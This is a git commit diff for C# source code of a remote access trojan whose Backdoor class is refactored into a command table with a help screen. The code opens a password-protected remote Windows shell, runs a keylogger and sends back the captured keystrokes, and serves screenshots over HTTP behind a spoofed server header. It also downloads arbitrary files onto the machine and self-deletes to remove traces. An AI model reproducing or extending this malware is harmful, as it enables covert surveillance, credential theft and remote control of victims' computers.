b66c48cabbb46a4ac4aac8fb7c2b92fab02826db
Toumash <mr.toumash@gmail.com>
2015-07-28 17:05:54 +0200

    New Command firing system + help viewer

--- Backdoor.cs
+++ Backdoor.cs
@@ -8,17 +8,13 @@ using System.Text;
 using System.Drawing;
 using System.Windows.Forms;
 using RAT;
+using System.Collections.Generic;
 
 namespace RAT
 {
     public class Backdoor
     {
-        TcpListener Listener;
-        Socket Socket;
-        StreamReader InStream;
-        StreamWriter OutStream;
-        Thread KeyloggerThread;
-        KeyLogger Keylogger;
+        int ScreenshotPort = 1336;
 
         int Port { get; set; }
         string Name { get; set; }
@@ -27,12 +23,49 @@ namespace RAT
 
         bool Alive { get; set; }
 
+        TcpListener Listener;
+        Socket Socket;
+        StreamReader InStream;
+        StreamWriter OutStream;
+
+        Thread KeyloggerThread;
+        KeyLogger Keylogger;
+
+        List<RCmd> availableCommands;
+        delegate void RatAction(StreamReader input, StreamWriter output, bool verbose);
+
         public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
         {
             this.Port = port;
             this.Name = serverName;
             this.Password = password;
             this.Verbose = verbose;
+
+            GenerateHelp();
+        }
+
+        void GenerateHelp()
+        {
+            availableCommands = new List<RCmd>()
+        {
+        new RCmd() {Name = "screenshot",        Command = C_Screenshot,     Help="Takes screenshot and then hosts it at given port as HTTP"},
+        new RCmd() {Name= "shell",             Command=C_Shell,             Help="Opens standard windows interactive command line"},
+        new RCmd() {Name= "keylogger-start",   Command=C_KeyLoggerStart,    Help="Enable saving EVERY keystroke at remote machine"},
+        new RCmd() {Name= "keylogger-dump",    Command=C_KeyLoggerDump,     Help="Stops the interception process and sends results back"},
+        new RCmd() {Name= "show-message",      Command=C_ShowMessage,       Help="Displays MessageBox on the remote machines screen"},
+        new RCmd() {Name= "download-file",     Command=C_DownloadFile,      Help="Connects with internet and downloads file to the rat directory"},
+        new RCmd() {Name= "self-delete",       Command=C_SelfDelete,        Help="Vanishes, kills every proof of self existence"},
+        new RCmd() {Name= "list-processes",    Command=C_ListProcesses,     Help="Displays ID,Name and window name of every running process"},
+        new RCmd() {Name= "change-wallpaper",  Command=C_ChangeWallpaper,   Help="Changes wallpaper to one from internet" },
+        new RCmd() {Name= "q",                 Command=C_Quit,              Help="Disconnects from the terminal (only current session)" }
+        };
+        }
+
+        class RCmd
+        {
+            public string Name { get; set; }
+            public string Help { get; set; }
+            public RatAction Command { get; set; }
         }
 
         public void Start()
@@ -105,130 +138,40 @@ namespace RAT
 
         void HandleCommand(string command)
         {
-            switch (command)
+            bool handled = false;
+
+            if (command.Equals("help"))
             {
-                case RatAction.SHELL:
-                    RemoteShell();
-                    break;
-                case RatAction.SCREENSHOT:
-                    if (Verbose) OutStream.WriteLine("Taking a screenshot...");
-                    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
-                    WindowsHelper.MakeScreenshot(path);
-
-                    Log("Image is hosted at port 2790");
-                    OutStream.WriteLine("Image is hosted at port 2790");
-                    HostImage(path);
-                    Log("Image Sent < OK > !");
-                    // delete all proofs
-                    File.Delete(path);
-                    Log("Image deleted");
-                    if (Verbose) OutStream.WriteLine("Screenshot downloaded and deleted successfully!");
-                    break;
-                case RatAction.KEYLOGGER_START:
-                    if (Keylogger != null)
-                    {
-                        Keylogger.StopAndDump();
-                    }
-                    Keylogger = new KeyLogger();
-                    KeyloggerThread = new Thread(new ThreadStart(Keylogger.Start));
-                    KeyloggerThread.Start();
-                    break;
-                case RatAction.KEYLOGGER_DUMP:
-                    string dump = Keylogger.StopAndDump();
-                    KeyloggerThread.Abort();
-                    KeyloggerThread = null;
-                    OutStream.WriteLine("Captured input:");
-                    OutStream.WriteLine(dump);
-                    break;
-                case RatAction.SHOW_MESSAGE:
-                    if (Verbose) Log("Show message mode");
-                    OutStream.WriteLine("Title:");
-                    string title = InStream.ReadLine();
-                    OutStream.WriteLine("Content");
-                    string content = InStream.ReadLine();
-
-                    OutStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
-                    string response = InStream.ReadLine();
-                    if (response.Equals("y"))
-                    {
-                        OutStream.WriteLine("Message shown");
-                        new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
-                        Log("Message shown");
-                    }
-                    else
-                    {
-                        Log("Message denied");
-                        OutStream.WriteLine("MessageBox showing denied by the user");
-                    }
-                    break;
-                case RatAction.DOWNLOAD_FILE:
-                    if (Verbose) Log("File download mode");
-
-                    OutStream.WriteLine("Enter URL of desired file to download:");
-                    string url = InStream.ReadLine();
-                    OutStream.WriteLine("FileName/Path on remote computer:");
-                    string filePath = InStream.ReadLine();
-                    try
-                    {
-                        using (var client = new WebClient())
-                        {
-                            client.DownloadFile(url, filePath);
-                        }
-                        OutStream.WriteLine("File downloaded successfully");
-                        Log("File downloaded successfully");
-                    }
-                    catch (Exception e)
-                    {
-                        if (Verbose) Log("Exception during file download:");
-                        OutStream.WriteLine("Exception during file download:" + e);
-                        Log(e.ToString());
-                    }
-
-                    break;
-                case RatAction.SELF_DELETE:
-                    OutStream.WriteLine("Are you sure, that you want to delete the backdoor? [Y/N]");
-                    var question = InStream.ReadLine();
-                    if (question.Equals("y"))
-                    {
-                        Log("Performing self-deletion");
-                        OutStream.WriteLine("Goodbye my friend!");
-                        WindowsHelper.SelfDelete();
-                        DropConnection();
-                        Environment.Exit(0);
-                    }
-                    break;
-                case RatAction.LIST_PROCESSES:
-                    Log("LIST_PROCESSES MODE");
-                    Process[] allProcesses = Process.GetProcesses();
-                    foreach (Process process in allProcesses)
-                    {
-                        OutStream.WriteLine("#{0} \t{1} ", process.Id, process.ProcessName);
-                    }
-                    break;
-                case RatAction.CHANGE_WALLPAPER:
-                    OutStream.WriteLine("Enter the uri of new wallpaper:");
-                    var uri = InStream.ReadLine();
-                    try
-                    {
-                        WindowsHelper.Wallpaper.SetTo(new Uri(uri), WindowsHelper.Wallpaper.Style.Centered);
-                        OutStream.WriteLine("\r\nWallpaper set!");
-                        Log("Wallpaper set!");
-                    }
-                    catch (Exception e)
-                    {
-                        OutStream.WriteLine("Some error when setting wallpaper:\r\n" + e);
-                        Log("<ERROR> when setting wallpaper:" + e);
-                    }
-                    break;
-                case RatAction.QUIT:
-                    OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
-                    DropConnection();
-                    Alive = false;
-                    break;
-                default:
-                    OutStream.WriteLine("no such command. Try help commandfor more info");
-                    break;
+                DisplayHelp(OutStream);
+                handled = true;
             }
+
+            foreach (var action in availableCommands)
+            {
+                if (action.Name.Equals(command))
+                {
+                    action.Command(InStream, OutStream, Verbose);
+                    handled = true;
+                    break;
+                }
+            }
+            if (!handled)
+            {
+                OutStream.WriteLine("no such command. Type \"help\" for more information");
+            }
+        }
+
+        void DisplayHelp(StreamWriter outStream)
+        {
+            outStream.WriteLine(StringExtensions.GenerateNStrings(80, "-"));
+            outStream.WriteLine(StringExtensions.AlignCenter("  H E L P  ", 80, '-'));
+            outStream.WriteLine(StringExtensions.GenerateNStrings(80, "-") + "\r\n");
+
+            foreach (var entry in availableCommands)
+            {
+                outStream.WriteLine(String.Format("{0}  - {1}", entry.Name, entry.Help));
+            }
+            outStream.WriteLine("\r\n" + StringExtensions.GenerateNStrings(80, "-"));
         }
 
         public void DropConnection()
@@ -240,36 +183,29 @@ namespace RAT
             if (Verbose) Log("Client Disconnected");
         }
 
-        void Log(string message)
+        static void Log(string message)
         {
             Console.WriteLine(message);
         }
 
-        void HostImage(string path)
+        #region commands
+        public void C_Screenshot(StreamReader inStream, StreamWriter outStream, bool verbose)
         {
-            string responseHeaders =
-                "HTTP/1.1 200 OK\r\n" +
-                "Server: google.com\r\n" +
-                "Content-Length: " + new FileInfo(path).Length + "\r\n" +
-                "Content-Type: image/png\r\n" +
-                "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
-                "\r\n";
+            if (verbose) outStream.WriteLine("Taking a screenshot...");
+            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
+            WindowsHelper.MakeScreenshot(path);
 
-            //headers should ALWAYS be ascii. Never UTF8
-            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);
-
-            var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
-            lstr.Start();
-            Log("Waiting for client to connect...");
-            var webSocket = lstr.AcceptSocket();
-
-            webSocket.Send(headerBytes);
-            webSocket.SendFile(path);
-            webSocket.Close();
-            lstr.Stop();
+            Log("Image is hosted at port 2790");
+            outStream.WriteLine("Image is hosted at port " + ScreenshotPort);
+            NetworkHelper.HostImage(path, Log, ScreenshotPort);
+            Log("Image Sent < OK > !");
+            // delete all proofs
+            File.Delete(path);
+            Log("Image deleted");
+            if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
         }
 
-        void RemoteShell()
+        public void C_Shell(StreamReader inStream, StreamWriter outStream, bool verbose)
         {
             try
             {
@@ -300,7 +236,7 @@ namespace RAT
                         {
                             while (read && (shellOutBuffer = FromShell.ReadLine()) != null)
                             {
-                                OutStream.WriteLine(shellOutBuffer + "\r");
+                                outStream.WriteLine(shellOutBuffer + "\r");
 
                                 {
                                     // temporary, for logging
@@ -314,7 +250,7 @@ namespace RAT
                     }).Start();
 
                     string buffer = "";
-                    while (((buffer = InStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
+                    while (((buffer = inStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
                     {
                         ToShell.WriteLine(buffer + "\r\n");
                     }
@@ -323,11 +259,132 @@ namespace RAT
             }
             catch (Exception e)
             {
-                OutStream.WriteLine(e);
+                outStream.WriteLine(e);
                 Log(e.ToString());
             }
-            OutStream.WriteLine("==== Shell exited! ====");
-            if (Verbose) Log("Shell exit");
+            outStream.WriteLine("==== Shell exited! ====");
+            if (verbose) Log("Shell exit");
         }
+
+        public void C_KeyLoggerStart(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            if (Keylogger != null) { return; }
+
+            Keylogger = new KeyLogger();
+            KeyloggerThread = new Thread(new ThreadStart(Keylogger.Start));
+            KeyloggerThread.Start();
+        }
+
+        public void C_KeyLoggerDump(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            string dump = Keylogger.StopAndDump();
+            KeyloggerThread.Abort();
+            KeyloggerThread = null;
+            outStream.WriteLine("Captured input:");
+            outStream.WriteLine(dump);
+        }
+
+        public void C_ShowMessage(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            outStream.WriteLine("Title:");
+            string title = inStream.ReadLine();
+            outStream.WriteLine("Content");
+            string content = inStream.ReadLine();
+
+            outStream.WriteLine(string.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
+            string response = inStream.ReadLine();
+            if (response.Equals("y"))
+            {
+                outStream.WriteLine("Message shown");
+                new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
+                Log("Message shown");
+            }
+            else
+            {
+                Log("Message denied");
+                outStream.WriteLine("MessageBox showing denied by the user");
+            }
+        }
+
+        public void C_DownloadFile(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            outStream.WriteLine("Enter URL of desired file to download:");
+            string url = inStream.ReadLine();
+            outStream.WriteLine("FileName/Path on remote computer:");
+            string filePath = inStream.ReadLine();
+            try
+            {
+                using (var client = new WebClient())
+                {
+                    client.DownloadFile(url, filePath);
+                }
+                outStream.WriteLine("File downloaded successfully");
+                Log("File downloaded successfully");
+            }
+            catch (Exception e)
+            {
+                if (Verbose) Log("Exception during file download:");
+                outStream.WriteLine("Exception during file download:" + e);
+                Log(e.ToString());
+            }
+        }
+
+        public void C_SelfDelete(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            outStream.WriteLine("Are you sure, that you want to delete the backdoor? [Y/N]");
+            var question = inStream.ReadLine();
+            if (question.Equals("y"))
+            {
+                Log("Performing self-deletion");
+                outStream.WriteLine("Goodbye my friend!");
+                WindowsHelper.SelfDelete();
+                DropConnection();
+                Environment.Exit(0);
+            }
+        }
+
+        public void C_ListProcesses(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            Process[] allProcesses = Process.GetProcesses();
+            foreach (Process process in allProcesses)
+            {
+                string pString = string.Empty;
+
+                if (!string.IsNullOrEmpty(process.MainWindowTitle))
+                {
+                    pString = string.Format("#{0} \t{1} T::", process.Id, process.ProcessName, process.MainWindowTitle);
+                }
+                else
+                {
+                    pString = string.Format("#{0} \t{1} ", process.Id, process.ProcessName);
+                }
+                outStream.WriteLine(pString);
+            }
+        }
+
+        public void C_ChangeWallpaper(StreamReader inStream, StreamWriter outStream, bool verbose)
+        {
+            outStream.WriteLine("Enter the uri of new wallpaper:");
+            var uri = inStream.ReadLine();
+            try
+            {
+                WindowsHelper.Wallpaper.SetTo(new Uri(uri), WindowsHelper.Wallpaper.Style.Centered);
+                outStream.WriteLine("\r\nWallpaper set!");
+                Log("Wallpaper set!");
+            }
+            catch (Exception e)
+            {
+                outStream.WriteLine("Some error when setting wallpaper:\r\n" + e);
+                Log("<ERROR> when setting wallpaper:" + e);
+            }
+        }
+
+        public void C_Quit(StreamReader inStream, StreamWriter oOutStream, bool verbose)
+        {
+            oOutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
+            DropConnection();
+            Alive = false;
+        }
+        #endregion commands
     }
 }
---
+++ NetworkHelper.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace RAT
+{
+    static class NetworkHelper
+    {
+        public static void HostImage(string path, Action<string> log,int port)
+        {
+            string responseHeaders =
+                "HTTP/1.1 200 OK\r\n" +
+                "Server: google.com\r\n" +
+                "Content-Length: " + new FileInfo(path).Length + "\r\n" +
+                "Content-Type: image/png\r\n" +
+                "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
+                "\r\n";
+
+            //headers should ALWAYS be ascii. Never UTF8
+            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);
+
+            var lstr = new TcpListener(IPAddress.Any, port);
+            lstr.Start();
+            log("Waiting for client to connect...");
+            var webSocket = lstr.AcceptSocket();
+
+            webSocket.Send(headerBytes);
+            webSocket.SendFile(path);
+            webSocket.Close();
+            lstr.Stop();
+        }
+    }
+}
